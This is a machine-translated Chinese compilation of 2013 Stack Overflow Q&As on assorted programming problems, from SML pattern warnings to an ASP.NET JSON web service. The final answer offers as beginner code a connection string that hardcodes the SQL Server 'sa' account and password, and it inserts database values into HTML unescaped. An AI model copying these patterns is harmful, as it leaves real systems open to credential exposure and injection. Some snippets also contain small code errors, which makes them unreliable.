CanCan 对您的应用程序做了两个假设。

*   您有一个定义权限的能力类。
*   您在控制器中有一个 current_user 方法，该方法返回当前用户模型。

您可以通过在 ApplicationController 中定义 current_ability 方法来覆盖这两者。

[https://github.com/ryanb/cancan/wiki/Changing-Defaults](https://github.com/ryanb/cancan/wiki/Changing-Defaults)

# sml - sml 抑制故意非详尽模式匹配的警告

> ID：15443813
> 
> 赞同：1
> 
> 时间：2013-03-15T23:40:15.713
> 
> 标签：sml

假设我有一个像这样的数据类型：

```
datatype location = Safe of string | Dangerous of string * int; 
```

在这个假设的例子中，我想编写一个只会传递 a`Safe str`而永远不会传递 a 的函数`Dangerous(str, num)`：

```
fun send_kids (Safe address) = ... 
```

有没有办法抑制警告？告诉 SML 我*知道*这不是详尽无遗的吗？

```
stdIn:1.6-1.29 Warning: match nonexhaustive
          Safe s => ... 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-16T06:53:05.307

不是直接的。您通过使失败案例详尽无遗来“告诉” SML：

```
fun sendKinds (Safe address) = ...
  | sendKinds _ = raise Fail "sendKinds" 
```

# mongodb - 在主从 Mongo 数据库集中，如果您不小心写入辅助节点，它会反映在主节点中吗？它会被路由到主节点

> ID：15443814
> 
> 赞同：2
> 
> 时间：2013-03-15T23:40:29.810
> 
> 标签：mongodb

在我们的 mongodb 集中，我们有 1 个主节点和 3 个辅助节点。意外地在辅助节点上完成了写入，并且写入已更新到包括主节点在内的其他成员。不确定更新是否路由到主节点或者在 mongodb 中是否可以写入辅助节点？其中一个成员在恢复模式下时间。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-16T22:53:42.083

无法写入 MongoDB 副本集中的辅助节点。

如果写入成功，它将转到主节点（从那里复制到所有辅助节点）。

其他节点的状态（恢复、启动）与此无关。辅助节点根本无法接受写入（通过复制机制除外）。

# c# - 递归遍历目录树并列出文件名

> ID：15443815
> 
> 赞同：9
> 
> 时间：2013-03-15T23:40:43.697
> 
> 标签：c#, recursion, directory

我试图遍历整个目录树并打印出列表框控件上的所有文件名。我写了一些代码，但有错误。不知道我做错了什么。顺便说一句，这是在 C# 中使用 Visual Studio 中的 WPF。

这是 Visual Studio 中的整个项目解决方案：http: [//tinyurl.com/a2r5jv9](http://tinyurl.com/a2r5jv9)

如果您不想下载项目解决方案，这里是 MainWindow.xaml.cs 的代码：http: [//pastebin.com/cWRTeq3N](http://pastebin.com/cWRTeq3N)

我也会在这里粘贴代码。

```
public partial class MainWindow : Window
{
    private void Button_Click_1(object sender, RoutedEventArgs e)
    {
        string sourcePath = @"C:\temp\";            

        static void DirSearch(string sourcePath)
        {
            try
            {
                foreach (string d in Directory.GetDirectories(sourcePath))
                {
                    foreach (string f in Directory.GetFiles(d))
                    {
                        listBox1.Items.Add(f);
                    }
                    DirSearch(d);
                }
            }                      
            catch (Exception ex)
            {
                listBox1.Items.Add(ex.Message);
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-03-15T23:43:50.937

Microsoft 支持站点上有一个[完整的示例](http://support.microsoft.com/kb/303974)

这里的问题是您想从事件处理程序中*调用* `DirSearch`，但您似乎正在尝试在事件处理程序中*定义*方法`DirSearch`。这是无效的。

您需要按如下方式更改代码：

```
private void Button_Click_1(object sender, RoutedEventArgs e)
{
    string sourcePath = @"C:\temp\";
    this.DirSearch(sourcePath);
}

private void DirSearch(string sDir) 
{
    try 
    {
        foreach (string f in Directory.GetFiles(sDir, txtFile.Text)) 
        {
            lstFilesFound.Items.Add(f);
        }

        foreach (string d in Directory.GetDirectories(sDir)) 
        {
            this.DirSearch(d);
        }
    }
    catch (System.Exception excpt)
    {
        listBox1.Items.Add(ex.Message);
    }
} 
```

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2013-03-15T23:45:18.623

使用[GetDirectories() 重载接受 SearchOption](http://msdn.microsoft.com/en-us/library/ms143314.aspx)：

```
string[] dirs = Directory.GetDirectories(path, "*", SearchOption.AllDirectories))
foreach(dir)
{
    ...
} 
```

或更好[的 EnumerateFiles()](http://msdn.microsoft.com/en-us/library/dd383571.aspx)：

```
IEnumerable<string> files = Directory.EnumerateFiles(path, "*.*", SearchOption.AllDirectories))
foreach(files)
{
    ...
} 
```

注意它执行*惰性*文件系统扫描。

# iphone - Facebook 墙贴在 Facebook 注册 iOS-facebook SDK 3.2 之后

> ID：15443818
> 
> 赞同：1
> 
> 时间：2013-03-15T23:41:31.800
> 
> 标签：iphone, ios, xcode, facebook, ipad

**脸书 SDK 3.2**

在使用 Facebook 登录后，我需要在 facebook 上发布一个墙贴。

这是我正在使用的代码：

在这里，我打开了 Facebook 会话：

```
- (IBAction)FBSignup:(id)sender {
    [[AppDelegate sharedObject] openSession:^(FBSession *session, FBSessionState state, NSError *error) {
        [self sessionStateChanged:session state:state error:error];
    }];
} 
```

在状态更改时，我使用**[self populateUserDetails] 填充**数据，然后尝试使用**[self postOnFB]**在 facebook 墙上发帖，但 facebook 墙上没有帖子。

```
- (void)sessionStateChanged:(FBSession *)session
                      state:(FBSessionState) state
                      error:(NSError *)error
{
    switch (state) {
        case FBSessionStateOpen:

            [self populateUserDetails];
            [self postOnFB];
            break;

        case FBSessionStateClosed:
        case FBSessionStateClosedLoginFailed:
            [FBSession.activeSession closeAndClearTokenInformation];
            break;
        default:
            break;
    }

    [[NSNotificationCenter defaultCenter]
     postNotificationName:SCSessionStateChangedNotification
     object:session];

    if (error) {
        UIAlertView *alertView = [[UIAlertView alloc]
                                  initWithTitle:@"Error"
                                  message:error.localizedDescription
                                  delegate:nil
                                  cancelButtonTitle:@"OK"
                                  otherButtonTitles:nil];
        [alertView show];
    }
} 
```

在这里，我在需要的地方使用 facebook 用户对象填充数据。

```
- (void)populateUserDetails
{
    if (FBSession.activeSession.isOpen) {

        [[FBRequest requestForMe] startWithCompletionHandler:
         ^(FBRequestConnection *connection, NSDictionary<FBGraphUser> *user, NSError *error) {

             if (!error) {
               ///////////////////////////////  
               // Populating Data Where Needed
               ///////////////////////////////

              //   [self postOnFB];
             }
         }];
    }
} 
```

在这里，我尝试使用**[self postOnFB]**发布墙帖，但出现错误：

> 由于未捕获的异常“com.facebook.sdk:InvalidOperationException”而终止应用程序，原因：“FBSession：在先前的重新授权调用尚未完成时重新授权无效。

我在这里张贴到墙上。

```
- (void)postOnFB{

    // Ask for publish_actions permissions in context
    if ([FBSession.activeSession.permissions
         indexOfObject:@"publish_actions"] == NSNotFound) {
        // No permissions found in session, ask for it
        [FBSession.activeSession requestNewPublishPermissions:[NSArray arrayWithObject:@"publish_actions"]
                                              defaultAudience:FBSessionDefaultAudienceFriends
                                            completionHandler:^(FBSession *session, NSError *error) {
                                                if (!error) {
                                                    [self fbPostSettings];
                                                }
                                            }];
    } else {
        // If permissions present, publish the story
        [self fbPostSettings];
    }
} 
```

脸书墙贴的设置参数：

```
- (void)fbPostSettings{

NSDictionary * facebookParams = [[NSMutableDictionary alloc] initWithObjectsAndKeys:
     kFacebookPostLink,                             @"link",
     kFacebookPostImage,                            @"picture",
     kFacebookPostName,                             @"name",
     kFacebookPostCaption,                          @"caption",
     kFacebookPostDescription,                      @"description",
     nil];

    [FBRequestConnection startWithGraphPath:@"me/feed"
                                 parameters:facebookParams
                                 HTTPMethod:@"POST"
                          completionHandler:^(FBRequestConnection *connection,
                                              id result,
                                              NSError *error) {
                              NSString *alertText;
                              if (error) {
                                  alertText = [NSString stringWithFormat:
                                               @"error: domain = %@, code = %d",
                                               error.domain, error.code];
                              } else {
                                  alertText = [NSString stringWithFormat:
                                               @"Posted action, id: %@",
                                               [result objectForKey:@"id"]];
                              }
                              NSLog(@"%@",alertText);
                          }];
}

- (void)sessionStateChanged:(NSNotification*)notification {
    [self populateUserDetails];
} 
```

如果我在某个按钮操作选择器上调用**postOnFB**（通过 facebook 用户对象完成数据填充后），它会在墙上正常发布。但我需要在**startWithCompletionHandler: ^(FBRequestConnection *connection, NSDictionary *user, NSError *error)**方法中获取用户对象后发布它。

请帮忙。谢谢大家 ：）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-16T01:40:31.563

而不是打开会话然后请求发布权限，而是直接请求发布权限以打开会话

```
[FBSession openActiveSessionWithPublishPermissions:[NSArray arrayWithObjects:@"publish_stream",
                                                    nil] defaultAudience:FBSessionDefaultAudienceEveryone allowLoginUI:YES completionHandler:^(FBSession *session, 
   FBSessionState state, NSError *error) {
if (FBSession.activeSession.isOpen && !error) {
     [self fbPostSettings]; 
}]; 
```

# php - PHP 群写入打开文件

> ID：15443820
> 
> 赞同：0
> 
> 时间：2013-03-15T23:41:40.917
> 
> 标签：php, fopen, flock, fclose

我有一个 php 脚本，用于记录网站的广告（横幅）并将它们存储到 .dat 文件中。在此文件中保存了 ID、URL 和其他重要信息。我遇到的问题是页面上在任何给定时间都有 4 个广告，因此当 php 脚本在打开时尝试写入时，.dat 文件通常会损坏。
我检查并尝试了这个解决方案，但它对我没有帮助： [PHP 同时文件访问/flock() 问题](https://stackoverflow.com/questions/9168724/php-simultaneous-file-access-flock-issue/9176384#9176384)

我现在使用的功能是这样的：

```
function writeads(){
    global $bannerAdsPath, $ads, $bannerAds;
    $data = fopen($bannerAdsPath, 'w') or die();
    flock($data, 2) or die();
    fputs($data, @join("\n", $ads)."\n");
    while (list ($key, $val) = each ($bannerAds)) {
        if (($key != '') && ($val != '')) {
            fputs($data, $key.'='.$val."\n");
        }
    }
    flock($data, 3);
    fclose($data);
    reset($bannerAds);
} 
```

任何帮助将不胜感激，因为我已经为此苦恼了一段时间。附带一点信息，客户不希望重写他们的代码以使用数据库而不是文件，因此该选项已失效。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-10T16:46:11.327

带有 'w' 的 fopen 会在您选择植绒之前截断文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T23:44:01.150

你几乎不想用它`flock`来解锁文件；只需使用`fclose`; 当句柄关闭时，文件将被解锁，这样您就知道解锁后不会发生缓冲写入。

# java - javafx的javabeans浏览组件？

> ID：15443827
> 
> 赞同：1
> 
> 时间：2013-03-15T23:42:22.530
> 
> 标签：java, javafx-2, javabeans

我想在某些 javafx 应用程序的 GUI 中包含一个 JavaBeans 浏览器。我的意思是，接收遵循 JavaBeans 约定的对象集合作为输入并允许在树列表中检查它们的属性的东西。Javafx 是否存在这样的事情？或者至少对于 Swing ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-16T00:09:44.123

虽然我确信 Swing 存在这样的组件，但我的回答仅限于讨论潜在的基于 JavaFX 的解决方案。

使用 JavaFX 实现 JavaBeans 浏览组件是可能的，但这需要一些工作，而且据我所知，没有现成的组件可以做到这一点。

仅进行浏览的解决方案将比还允许编辑或两种方式反映属性值的解决方案更易于构建。

基于 JavaFX 的解决方案的起点可能是第 3 方[DataFX](http://www.javafxdata.org/)项目，其中提到了使用 Java bean 作为“数据源”的能力。

JavaFX [SceneBuilder](http://www.oracle.com/technetwork/java/javafx/tools/index.html)应用程序必须在内部做这种事情，但不幸的是它不是开源的。

您可以查看的另一个类似应用程序是[ScenicView](http://fxexperience.com/scenic-view/)，它应该包含实现您正在寻找的那种属性浏览自省的代码。ScenicView 可能是开源的。我建议向程序作者询问源代码，因为调整其中的一些代码可能会为您节省大量时间，而不是尝试自己构建类似的解决方案。如果您可以将 ScenicView 从一个特定于 SceneGraph 的工具转变为一个可嵌入到另一个应用程序中的通用对象浏览器，那就太好了。. .

JavaFX ScenicView 应用程序的屏幕截图： ![优美的风景](../Images/25a8f8262c6c339b4244eaaf71eaecda.png)

另一个简单解决方案的有用资源是这篇文章：

[如何使用 Listview / Tableview 创建属性编辑器](https://forums.oracle.com/forums/thread.jspa?messageID=10685084)

# python - 基本 Python 条件

> ID：15443828
> 
> 赞同：0
> 
> 时间：2013-03-15T23:42:22.340
> 
> 标签：python, if-statement, conditional-statements

我的程序中有这种情况：

```
if vals[k]==vals[i] and i!=k: 
```

当我期望这些值通过条件时，当 vals[k]==1、vals[i]==1、i==2 和 k==0 时，if 语句后面的代码将被跳过。我对 Python 语法的理解有什么根本错误吗？

这是一个作业，所以我不想包含太多代码，以防我被指控作弊，但这里还有一点：

```
for k in range(i-i%4,i+4-i%4):
    print vals[i]
    print vals[k]
    print i
    print k
    if vals[k]==vals[i] and i!=k: 
        isMatch = True
        print 'rowmatch'
        break 
```

（忽略打印语句，它们只是用于调试的笨拙辅助工具）

这是调试器返回的部分内容的副本：

![示例调试器输出](../Images/bc2d500d33e8b958647e75eeb833e69b.png)

[编辑] Russell Borogove 是对的，我将整数与字符串进行比较。现在感觉很笨，谢谢你的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T23:54:35.253

在 the 之前添加这一行`if`并回复我们：

```
print "vals[k] = %s vals[i] = %s i = %s k = %s"%(vals[k],vals[i],i,k) 
```

也许您在`vals`. 尝试：

```
for val in vals:
    print "%s %s"%(val.__class__,val) 
```

# php - PHP 私有变量访问

> ID：15443829
> 
> 赞同：0
> 
> 时间：2013-03-15T23:42:31.693
> 
> 标签：php, oop, codeigniter

这是一个非常愚蠢的问题，但我不知道有什么问题。我无法通过公共方法获取私有变量的值。我正在使用 CodeIgniter。

```
class someClass extends MY_Model {
  private $table = 'sometable';
  public function getTable() {
    return $this->table;
  }
  public function updateTable($data) {
    $this->db->update($this->getTable(), $data);
  }
} 
```

当我从控制器调用此方法时，我收到以下消息：

```
Fatal error: Access level to someClass::$table must be public (as in class MY_Model) in /some/path/someclass.php on line 38 
```

我做错了什么？谢谢你。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-15T23:45:33.027

您的父类`MY_Model`使用范围声明该字段`public`，因此您必须在子类中遵守该字段。

# c - 需要帮助理解位图、按位运算和 C

> ID：15443835
> 
> 赞同：1
> 
> 时间：2013-03-15T23:43:02.277
> 
> 标签：c, architecture, bitmap, binary

### 免责声明：我问这些与作业有关的问题。任务本身要求实现一个位图并用它做一些操作，但这不是我要问的。我只是想了解这些概念，以便我可以自己尝试实现。

我需要帮助理解位图/位数组和按位运算。我了解二进制的基础知识以及左/右移位的工作原理，但我不知道这种使用到底有什么好处。

基本上，我需要实现一个位图来存储（Eratosthenes 的）素筛的结果。这是专注于不同 IPC 方法的大型作业的一小部分，但要到达那部分，我需要先完成筛子. 我从来不需要使用按位运算，也从来没有学过位图，所以我有点靠自己来学习这个。

据我所知，位图是具有一定大小的数组，对吧？我的意思是你可以有一个 8 位数组或 32 位数组（在我的情况下，我需要找到 32 位无符号整数的素数，所以我需要 32 位数组。）所以如果这是一个位数组，具体来说是其中的 32 个，那么我们基本上是在谈论由 32 个 1 和 0 组成的字符串。这如何转化为素数列表？我认为一种方法可以评估二进制数并将其作为十进制数保存到一个新数组中，因此所有小数素数都存在于一个数组中，但这似乎您使用了太多数据。

我有位图的要点吗？还是我缺少什么？我已经尝试在互联网上阅读有关此内容的信息，但找不到对我来说足够清楚的来源...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-15T23:57:31.840

假设您有一个素数列表：{3, 5, 7}。您可以将这些数字存储为字符数组：`char c[] = {3, 5, 7}`这需要 3 个字节。

相反，让我们使用单个字节，以便每个设置位指示该数字在集合中。例如，01010100。如果我们可以设置我们想要的字节并稍后对其进行测试，我们可以使用它将相同的信息存储在单个字节中。设置它：

```
char b = 0;
// want to set `3` so shift 1 twice to the left
b = b | (1 << 2); 
// also set `5`
b = b | (1 << 4);
// and 7
b = b | (1 << 6); 
```

并测试这些数字：

```
// is 3 in the map:
if (b & (1 << 2)) {
  // it is in... 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T23:50:57.807

位图允许您在您感兴趣的数字范围内构造一个大型*谓词*函数。如果您只有一个 8 位字符，则可以为八个值中的每一个存储布尔值。如果你有 2 个字符，它会使你的范围加倍。

因此，假设您有一个已存储此信息的位图，您的*测试*函数可能如下所示：

```
bool num_in_bitmap (int num, char *bitmap, size_t sz) {
    if (num/8 >= sz) return 0;
    return (bitmap[num/8] >> (num%8)) & 1;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-16T01:15:12.660

您将需要比 32 位多得多的数据。

您需要一个最多 2^32 个数字的筛子，因此每个数字都需要一点。每个位将代表一个数字，如果数字是素数，则为 0，如果是合数，则为 1。（您可以通过注意第一位必须是 2 来节省一位，因为 1 既不是素数也不是复合数。浪费那一位更容易。）

2^32 = 4,294,967,296

除以 8

536,870,912 字节，或 1/2 GB。

因此，您将需要一个 2^29 字节或 2^27 个 4 字节字的数组，或任何您认为最好的数组，以及一种用于操作存储在数组中的字符（整数）中的各个位的方法。

听起来最终，您将有多个线程或进程在此共享内存上运行。如果您无法将所有内存分配给自己，您可能需要将它们全部存储在一个文件中。

假设您想找到 x 的位。然后让 a = x / 8 和 b = x - 8 * a。然后该位位于 arr[a] & (1 << b)。（尽可能避免使用模数运算符 %。）

```
//mark composite
a = x / 8;
b = x - 8 * a;
arr[a] |= 1 << b; 
```

这听起来像是一个有趣的任务！

# ios - 如何在 ios 6.1 xcode 4.6 中获取 json 数据

> ID：15443836
> 
> 赞同：1
> 
> 时间：2013-03-15T23:43:06.410
> 
> 标签：ios, json, ios6, ios6.1

如何获取链接的数据：[https](https://itunes.apple.com/us/rss/topalbums/limit=10/json) : //itunes.apple.com/us/rss/topalbums/limit=10/json 使用 ios6.1 xcode 4.6。
大部分代码是针对 ios5 的，很少使用 jsonKit。但是ios现在有任何内置的json解析吗？

我期待仅用于 ios6.1 而不是旧版本。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:48:29.963

```
NSError *requestError = NULL;
NSDictionary *myDict = [NSJSONSerialization JSONObjectWithData:responseData options:kNilOptions error:&requestError];
if (requestError){
    //An error occurred.
} 
```

+JSONObjectWithData 的返回类型是 id。它可以返回一个 NSDictionary 或一个 NSArray。选择适合您的 JSON 数据结构的那个。

responseData 是您响应中的数据。如果您有要解析的字符串，请将其转换为 NSData：[https ://stackoverflow.com/a/6188605/985050](https://stackoverflow.com/a/6188605/985050)

# c - 斐波那契输出错误？（C）

> ID：15443839
> 
> 赞同：4
> 
> 时间：2013-03-15T23:43:11.543
> 
> 标签：c, algorithm, fibonacci

```
int * fibonacci(int n) {
    int range = n + 1;
    int * arr = malloc(range * sizeof(int));
    arr(0) = 0;
    arr(1) = 1;
    for(int i = 2; i < range; ++i) {
        arr(i) = arr(0) + arr(1);   
    }
    return arr;
} 
```

我似乎无法确定我的程序出了什么问题，输出一直显示为 0、1、1、1、1 等等？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-15T23:47:03.553

```
arr(i) = arr(0) + arr(1); 
```

那不应该

```
arr(i) = arr(i-1) + arr(i-2); 
```

?

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-15T23:47:28.077

您的代码的作用如下：

```
arr(3) = 0 + 1
arr(4) = 0 + 1
arr(5) = 0 + 1 
```

等等。您一遍又一遍地分配相同的值。

你需要做：

```
 arr(i) = arr(i - 1) + arr(i - 2); 
```

**解释：**

假设您有数组：

*   arr(1) = 0
*   arr(2) = 1

并且`i`在索引 3 处，这将分配`arr(3) = arr(2) + arr(1)`1 + 0。因此 arr(3) = 1

`i`现在在索引 4 处，这将分配`arr(4) = arr(3) + arr(2)`1 + 1。因此 arr(4) = 2

# c# - 重载 + 运算符，使其对在已检查或未检查的上下文中调用很敏感

> ID：15443841
> 
> 赞同：7
> 
> 时间：2013-03-15T23:43:24.757
> 
> 标签：c#, operator-overloading, unchecked

**更新：**我找到了答案，如果没有其他人这样做，我将在几天内发布。

* * *

我正在创建一个数字结构，所以我重载了算术运算符。下面是一个表示 4 位无符号整数的结构示例：

```
public struct UInt4
{
    private readonly byte _value;

    private const byte MinValue = 0;
    private const byte MaxValue = 15;

    public UInt4(int value)
    {
        if (value < MinValue || value > MaxValue)
            throw new ArgumentOutOfRangeException("value");

        _value = (byte) value;
    }

    public static UInt4 operator +(UInt4 a, UInt4 b)
    {
        return new UInt4((a._value + b._value) & MaxValue);
    }
} 
```

重载的加法运算符允许以下代码：

```
var x = new UInt4(10);
var y = new UInt4(11);
var z = x + y; 
```

这里，计算溢出，所以变量 z 的值为`5`。但是，我也希望能够做到这一点：

```
var x = new UInt4(10);
var y = new UInt4(11);
var z = checked ( x + y ); 
```

此示例应引发 OverflowException。我怎样才能做到这一点？

我已经确定检查的上下文不会扩展到被调用的方法，因此，例如，无论是在检查的上下文还是未检查的上下文中调用它，它都不会抛出：

```
public static UInt4 operator +(UInt4 a, UInt4 b)
{
    int i = int.MaxValue;

    //this should throw in a checked context, but when
    //the operator is used in a checked context, this statement
    //is nonetheless unchecked.
    byte b = (byte)i;

    return new UInt4((a._value + b._value) & MaxValue);
} 
```

有没有办法声明加法运算符的两个重载，一个已检查，另一个未检查？或者，有没有办法在运行时确定调用者的上下文（这似乎不太可能，但我想我还是会问），如下所示：

```
public static UInt4 operator +(UInt4 a, UInt4 b)
{
    byte result = (byte)(a._value + b._value);

    if (result > MaxValue)
        if (ContextIsChecked())
            throw new OverflowException();
        else
            result &= MaxValue;
     return new UInt4(result);
}

private static bool ContextIsChecked()
{
    throw new NotImplementedException("Please help.");
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-16T00:07:55.450

[根据 MSDN](http://msdn.microsoft.com/en-us/library/74b4xzyw%28v=vs.110%29.aspx)，`checked`and`unchecked`关键字仅适用于[整数类型](http://msdn.microsoft.com/en-us/library/exx3b86w%28v=vs.110%29.aspx)。因此，您无法创建自己的类型来使用已检查和未检查的关键字。

# jquery - 如何使用 json 从 sql server ASP.net 中检索数据

> ID：15443843
> 
> 赞同：1
> 
> 时间：2013-03-15T23:43:44.597
> 
> 标签：jquery, asp.net, ajax, json, jquery-mobile

我正在尝试使用带有 C# 和 jquery mobile 的 asp.net 3.5 中的 web 服务从数据库中填充列表。

当我运行该站点时它工作正常，但是当我将它发布到我的服务器时它不会填充列表并且 ajax 错误函数会捕获一个错误。这是我的代码。

我的网络服务：

```
public class product
{
    //[product] ,[img1] ,[descr]
    public string name;
    public string img1;
    public string descr;

}

[WebService(Namespace = "http://tempuri.org/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
// To allow this Web Service to be called from script, using ASP.NET AJAX, uncomment the following line. 
 [System.Web.Script.Services.ScriptService]
public class CarService : System.Web.Services.WebService {

[WebMethod]
    public List<product> GetAllProducts()
    {
        List<product> productt = new List<product> {};

        string query = "SELECT [product] ,[img1] ,[descr] FROM [ELQ].[dbo].[products]";
        SqlCommand cmd = new SqlCommand(query);
        DataSet ds = GetData(cmd);
        DataTable dt = ds.Tables[0];

        // Process each employee record in table...
        //foreach (DataRow dr in dt.Rows)
        foreach(DataRow item in ds.Tables[0].Rows)
        {
            //productt.Add((DataRow) row);
            product pro = new product();
            pro.name = item["product"].ToString();
            pro.img1 = item["img1"].ToString();
            pro.descr = item["descr"].ToString();
            productt.Add(pro);
        }

        return productt; 
    }
    public static string GetShipDetails()
    {

        string query = "SELECT [product] ,[img1] ,[descr] FROM [ELQ].[dbo].[products]";
        SqlCommand cmd = new SqlCommand(query);
        return GetData(cmd).GetXml();
    }
    private static DataSet GetData(SqlCommand cmd)
    {
        string connString = "Data Source=GHOST-PC\\STC;Initial Catalog=ELQ;Integrated Security=True";
        using (SqlConnection con = new SqlConnection(connString))
        {
            using (SqlDataAdapter sda = new SqlDataAdapter())
            {
                cmd.Connection = con;
                sda.SelectCommand = cmd;
                using (DataSet ds = new DataSet())
                {
                    sda.Fill(ds);
                    return ds;
                }
            }
        }
    }

} 
```

剧本：

```
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Default.aspx.cs" Inherits="_Default" %>
<%@ Register TagPrefix="asp" Namespace="AjaxControlToolkit" Assembly="AjaxControlToolkit" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html>
<head runat="server">
    <title>jQuery Mobile Market</title>
    <link rel="stylesheet" href="http://code.jquery.com/mobile/1.3.0/jquery.mobile-1.3.0.min.css" />
    <script src="http://code.jquery.com/jquery-1.8.2.min.js"></script>
    <script src="http://code.jquery.com/mobile/1.3.0/jquery.mobile-1.3.0.min.js"></script>
    <script type="text/javascript">

            $(document).on('pageinit', function () {
                Greating();

            });

            function Greating() {

                $.ajax({

                    type: "POST",
                    url: "CarService.asmx/GetAllProducts",
                    data: "{}",
                    contentType: "application/json; charset=utf-8",
                    dataType: "json",
                    success: function (response) {

                        var productt = response.d;
                        $.each(productt, function (index, product) {

                            $("#theList").append("<li><img src='pic/" + product.img1 + "'> <br /> " + product.name + " <br />" + product.descr + "</li>");
                        });

                        $("#theList").listview("refresh");
                    },

                    error: function (response) {
                        $("#theList").append("<li>error<li>");
                    }
                });
            }
        </script> 
```

它看起来像 json 响应是错误的并产生错误，但是当我从笔记本电脑执行代码时它工作正常。我不知道我错过了什么，所以请帮助我。

错误：

```
POST http://192.168.1.7:7777/CarService.asmx/GetAllProducts 500 (Internal Server Error) jquery-1.8.2.min.js:2
send jquery-1.8.2.min.js:2
p.extend.ajax jquery-1.8.2.min.js:2
Greating 192.168.1.7:18
(anonymous function) 192.168.1.7:12
p.event.dispatch jquery-1.8.2.min.js:2
g.handle.h jquery-1.8.2.min.js:2
p.event.trigger jquery-1.8.2.min.js:2
(anonymous function) jquery-1.8.2.min.js:2
p.extend.each jquery-1.8.2.min.js:2
p.fn.p.each jquery-1.8.2.min.js:2
p.fn.extend.trigger jquery-1.8.2.min.js:2
a.Widget._trigger jquery.mobile-1.3.0.min.js:2
a.widget._createWidget jquery.mobile-1.3.0.min.js:2
(anonymous function) jquery.mobile-1.3.0.min.js:2
a.(anonymous function).(anonymous function) jquery.mobile-1.3.0.min.js:2
(anonymous function) jquery.mobile-1.3.0.min.js:2
p.extend.each jquery-1.8.2.min.js:2
p.fn.p.each jquery-1.8.2.min.js:2
a.fn.(anonymous function) jquery.mobile-1.3.0.min.js:2
C jquery.mobile-1.3.0.min.js:2
a.mobile.loadPage jquery.mobile-1.3.0.min.js:2
a.mobile.changePage jquery.mobile-1.3.0.min.js:2
a.mobile._handleHashChange jquery.mobile-1.3.0.min.js:2
(anonymous function) jquery.mobile-1.3.0.min.js:2
p.event.dispatch jquery-1.8.2.min.js:2
g.handle.h jquery-1.8.2.min.js:2
p.event.trigger jquery-1.8.2.min.js:2
(anonymous function) jquery-1.8.2.min.js:2
p.extend.each jquery-1.8.2.min.js:2
p.fn.p.each jquery-1.8.2.min.js:2
p.fn.extend.trigger jquery-1.8.2.min.js:2
(anonymous function) jquery.mobile-1.3.0.min.js:2 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-17T11:25:40.817

我修复了错误，实际上这不是错误我在我的数据库中有登录和身份验证问题所以我决定为像我这样的初学者发布代码所以这是我的代码

首先我建立了一个服务来处理我的数据库，我使用了一种简单的方法来做到这一点

这是我的 CarService 课程

```
using System;
using System.Collections.Generic;
//using System.Linq;
using System.Web;
using System.Web.Services;
using System.Data.SqlClient;
//using System.Web.Script.Serialization;
using System.Web.Script.Services;
using System.IO;
//using Newtonsoft.Json;
using System.Data;
using System.Text;

/// <summary>
/// Summary description for CarService
/// </summary>
[WebService(Namespace = "http://tempuri.org/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
// To allow this Web Service to be called from script, using ASP.NET AJAX, uncomment the following line. 
 [System.Web.Script.Services.ScriptService]
public class CarService : System.Web.Services.WebService {

    public class product
    {
        public string name;
        public string img1;
        public string descr;

    }

    static List<product> productt = new List<product> { };

    [ScriptMethod(ResponseFormat = ResponseFormat.Json)]
    [WebMethod]
    public List<product> GetAllProducts()
    {

        string query = "SELECT  [product] ,[img1] ,[descr] FROM [ELQ].[dbo].[products]";
        SqlCommand cmd = new SqlCommand(query);
        DataSet ds = GetData(cmd);
        DataTable dt = ds.Tables[0];
        foreach(DataRow item in ds.Tables[0].Rows)
        {
            product pro = new product();
            pro.name = item["product"].ToString();
            pro.img1 = item["img1"].ToString();
            pro.descr = item["descr"].ToString();
            productt.Add(pro);
        }

        return productt; 
    }

    private static DataSet GetData(SqlCommand cmd)
    {
        string connString = "Data Source=GHOST-PC\\STC;Initial Catalog=ELQ;Persist Security Info=True;User ID=sa;Password=seif@ghost";
        string str = "Data Source=GHOST-PC\\STC;Initial Catalog=ELQ;Persist Security Info=True;User ID=sa;Password=seif@ghost";
        using (SqlConnection con = new SqlConnection(str))
        {
            using (SqlDataAdapter sda = new SqlDataAdapter())
            {
                cmd.Connection = con;
                sda.SelectCommand = cmd;
                using (DataSet ds = new DataSet())
                {
                    sda.Fill(ds);
                    return ds;
                }
            }
        }
    }

} 
```

然后这是我的包

```
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Default.aspx.cs" Inherits="_Default" %>

<%@ Register TagPrefix="asp" Namespace="AjaxControlToolkit" Assembly="AjaxControlToolkit" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head runat="server">
    <title>jQuery Mobile Market</title>
    <link rel="stylesheet" href="http://code.jquery.com/mobile/1.3.0/jquery.mobile-1.3.0.min.css" />
    <script src="http://code.jquery.com/jquery-1.8.2.min.js"></script>
    <script src="http://code.jquery.com/mobile/1.3.0/jquery.mobile-1.3.0.min.js"></script>
    <script type="text/javascript" type="text/javascript">

        $(document).ready(function () {

            $("#theList").removeData();
            Greating();
        });

        function Greating() {

            $.ajax({

                type: "POST",
